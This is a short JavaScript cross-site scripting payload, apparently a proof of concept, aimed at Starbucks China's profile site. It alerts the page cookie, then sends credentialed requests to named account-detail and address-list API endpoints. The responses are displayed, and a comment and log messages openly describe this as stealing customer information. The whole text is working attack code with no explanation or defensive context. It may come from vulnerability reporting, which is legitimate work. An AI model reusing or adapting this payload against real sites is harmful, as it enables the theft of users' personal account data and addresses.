alert(document.cookie);//
//steal the customer's information
var steal = new XMLHttpRequest();
steal.open('get', 'https://profile.starbucks.com.cn/api/account/detail');
steal.withCredentials = true;
steal.send();
steal.onreadystatechange = function () {
      if (steal.readyState == 4 && steal.status == 200) {
            console.log('数据偷取成功');
            alert(steal.responseText);
    }
}


var stealAddress = new XMLHttpRequest();
stealAddress.open('get', 'https://profile.starbucks.com.cn/api/Customers/addresses/list');
stealAddress.withCredentials = true;
stealAddress.send();
stealAddress.onreadystatechange = function () {
      if (stealAddress.readyState == 4 && stealAddress.status == 200) {
            console.log('数据偷取成功');
            alert(stealAddress.responseText);
    }
}
